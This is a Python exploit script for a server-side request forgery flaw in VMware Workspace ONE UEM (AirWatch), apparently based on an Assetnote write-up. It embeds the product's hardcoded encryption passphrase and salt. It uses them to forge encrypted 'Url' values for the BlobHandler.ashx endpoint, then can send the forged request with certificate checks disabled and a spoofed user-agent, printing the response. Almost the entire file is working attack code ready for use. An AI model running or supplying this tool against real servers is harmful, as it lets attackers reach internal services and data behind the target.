from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Protocol.KDF import PBKDF2
import base64, sys, argparse, requests
from urllib.parse import urljoin

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'

#https://stackoverflow.com/a/41041028/13886183
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass

class SSRFCrypto:
    def getKey(self):
        if self.Key == None:
            self.Key = PBKDF2(self.PassPhrase, self.SaltValue, self.KeySize // 8, count=self.PasswordIterations)

        return self.Key

    def __init__(self):
        self.PassPhrase = '5c5e2c554f4f644b54383127495b356d7b36714e4b214a6967492657290123a0'
        self.SaltValue = 's@1tValue'
        self.KeySize = 256
        self.KeyVersion = 'kv0'
        self.CryptoVersion = 'awev2'
        self.PasswordIterations = 200000


        self.Key = None

    def getIV(self):
        return Random.new().read(12)

    def encryptWithKeyIv(self, text, key, iv):
        aesCipher = AES.new(key, AES.MODE_GCM, iv)

        ciphertext, tag = aesCipher.encrypt_and_digest(text)

        r = chr(len(tag)).encode() + tag + ciphertext

        return chr(len(tag)).encode() + tag + ciphertext

    def decryptWithKeyIv(self, payload, key, iv):
        
        tagLen = payload[0]
        if tagLen > 0:
            tag = payload[1:tagLen + 1]

            payload = payload[tagLen + 1:]

            aesCipher = AES.new(key, AES.MODE_GCM, iv)
            return aesCipher.decrypt_and_verify(payload, tag)
        
        return None

    def EncryptString(self, text):
        iv = self.getIV()

        key = self.getKey()
        payload = self.encryptWithKeyIv(text.encode(), key, iv)

        payload = base64.b64encode(payload).decode()

        payload = "{0}:{1}:{2}:{3}".format(self.CryptoVersion, self.KeyVersion, base64.b64encode(iv).decode(), payload)
        
        payload = list(payload.encode())

        
        unicode_arr = []
        for i in payload:
            unicode_arr.append(i)
            unicode_arr.append(0)

        return base64.b64encode(bytearray(unicode_arr)).decode()


    def normalize(self, arr):
        ret = []

        for i in list(arr):
            if i == 0:
                continue

            ret.append(i)

        return bytearray(ret).decode()

    def DecryptString(self, payload):

        try:
            payload = self.normalize(base64.b64decode(payload))
        except Exception as e:
            print('payload:', e)
            return None

        if payload.count(':') != 3:
            return None

        cryptoVersion, keyVersion, iv, cipher = payload.split(':')

        if len(cryptoVersion) < 1 or len(keyVersion) < 1 or len(iv) < 1 or len(cipher) < 1:
            return None

        if self.CryptoVersion != cryptoVersion:
            print('Invalid CryptoVersion')
            return None

        
        if self.KeyVersion != keyVersion:
            print('Invalid KeyVersion')
            return None

        try:
            iv = base64.b64decode(iv.encode())
        except Exception as e:
            print('IV:', e)
            return None
        

        if len(iv) != 12:
            print('Invalid IV')
            return None

       
        try:
            cipher = base64.b64decode(cipher.encode())
        except Exception as e:
            print('Cipher:', e)
            return None
        
        return self.decryptWithKeyIv(cipher, self.getKey(), iv).decode()

def generate_url(baseurl, payload, airwatch):
    return urljoin(baseurl, ('/AirWatch/BlobHandler.ashx?Url=' if airwatch else '/Catalog/BlobHandler.ashx?Url=') + payload)
    

def request_url(url, timeout=30, proxy=None, debug=None, method='GET', data=None, headers={}):
    try:
        if 'user-agent' not in headers:
            headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'

        res = requests.request(method, url, headers=headers, data=data, timeout=timeout, verify=False, allow_redirects=False, proxies=({'http': proxy, 'https': proxy} if proxy else None))

        if debug:
            print('HTTP/1.1 {0} {1}'.format(res.status_code, res.reason))

            for key in res.headers:
                print('{0}: {1}'.format(key, res.headers[key]))

            print()
        print(res.text)
    except Exception as e:
        print(e)

class Extender(argparse.Action):
    def __call__(self,parser,namespace,values,option_strings=None):
        #Need None here incase `argparse.SUPPRESS` was supplied for `dest`
        dest = getattr(namespace,self.dest,None) 
        #print dest,self.default,values,option_strings
        if(not hasattr(dest,'extend') or dest == self.default):
            dest = []
            setattr(namespace,self.dest,dest)
            #if default isn't set to None, this method might be called
            # with the default as `values` for other arguements which
            # share this destination.
            parser.set_defaults(**{self.dest:None}) 

        try:
            dest.extend(values)
        except ValueError:
            dest.append(values)



def parse_headers(headers):
    ret = {}
    if headers:
        for i in headers:
            t = i.split(':')
            if len(t) == 2 and len(t[0]) > 0 and len(t[1]) > 0:
                ret[t[0].lower().replace(' ', '')] = t[1][1:] if t[1].startswith(' ') else t[1]

    return ret

def main():

    #Based in assetnote script
    # https://blog.assetnote.io/2022/04/27/vmware-workspace-one-uem-ssrf/

    
    argparser = argparse.ArgumentParser()

    argparser.add_argument("--url", help="AirWatch URL (i.e. https://mdm.corp.evilcorp.com)")
    argparser.add_argument("--ssrf", help="SSRF URL (i.e. https://example.com", default='https://example.com')

    argparser.add_argument("--airwatch", help="Use Airwatch route instead of Catalog",  action='store_true')
    argparser.add_argument("--request", help="Request the SSRF URL after generating", action='store_true')
    argparser.add_argument('--proxy', help='Use proxy, ex: --proxy=http://127.0.0.1:8080', type=str)
    argparser.add_argument('--decrypt', help='Decrypt payload', type=str)
    argparser.add_argument('--timeout', help='Http timeout request', type=int, default=15)
    argparser.add_argument("--debug-headers", help="View http response headers", action='store_true')
    argparser.add_argument('--method', help='HTTP method to send', default='GET', type=str)
    argparser.add_argument('--data', help='Send body', type=str)
    
    argparser.add_argument('-H', '--header', help='Send headers', type=str, nargs='*', action=Extender)

    args = argparser.parse_args()
    
    if len(sys.argv) < 2:
        return argparser.print_help()

    vwc = SSRFCrypto()

    if args.decrypt:
        r = vwc.DecryptString(args.decrypt)
        if r != None:
            print('Result:')
            print(r)

        return

    if not args.url:
        return argparser.print_help()

    payload = vwc.EncryptString(args.ssrf)

    url = generate_url(args.url, payload, args.airwatch)



    print('Generated SSRF payload:')
    print(url + '\n')

    if args.request:
        headers = parse_headers(args.header)
        method = args.method.lower()

        if method not in ['head', 'trace', 'options', 'delete', 'put', 'post', 'get']:
            method = 'get'

        request_url(url, args.timeout, args.proxy, args.debug_headers, method=args.method, headers=headers, data=args.data)

if __name__ == '__main__':
    main()
